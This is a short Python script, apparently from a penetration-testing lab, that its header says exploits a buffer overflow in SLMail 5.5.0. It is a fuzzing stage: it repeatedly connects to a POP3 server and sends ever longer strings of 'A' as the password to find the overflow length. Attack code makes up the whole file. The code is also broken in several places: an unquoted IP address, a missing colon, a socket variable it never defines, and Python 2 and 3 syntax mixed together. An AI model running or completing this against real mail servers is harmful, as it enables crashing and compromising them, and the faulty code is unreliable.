#!/usr/bin/env python3

# 
# Exploits buffer overflow for SLMail-5.5.0 over POP3 protocol
#
# Author: Devin Trejo
# Date: 20160408

import socket, sys, os

def main():
    # Client machine IPv4 address
    clientIP = 192.168.56.105
    clinetPORT = 110

    # Maximum size of PASS buffer sized passed to POP3 server
    MAX_PASS_BUFFER_LEN = 1000

    # Declare a acceptable buffer size that fits into TCP Packet
    BUFFER_SIZE = 1024

    # Create a new socket to the server
    serverSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Define Static username to pass into POP3 protocol USER prompt
    #
    USER = "user"

    # Check to see if the a name exists on the remote machine
    for i in xrange(0,MAX_PASS_BUFFER_LEN)
        # Try to connect to passed IP
        try:
            s.connect((clientIP, clinetPORT))
        except Exception:
            print("\n\nConnection could not be made to server.")
            s.close()
            return -1

        # Print for debug to console the length of password buffer
        print("\n\nTesting Password Buffer Size i =" + str(i))

        # Send server username
        s.send(bytes("USER " + USER + "\r\n", 'UTF-8'))
        
        # Wait to receive a message
        data = s.recv(BUFFER_SIZE)
        data =  bytes.decode(data, 'UTF-8')
        print("Received data: \n" + data)

        # Send server password (with long string of A times i)
        s.send(bytes("PASS " + "A"*i + "\r\n"))

        # Wait to receive a message
        data = s.recv(BUFFER_SIZE)
        data =  bytes.decode(data, 'UTF-8')
        print("Received data: \n" + data)
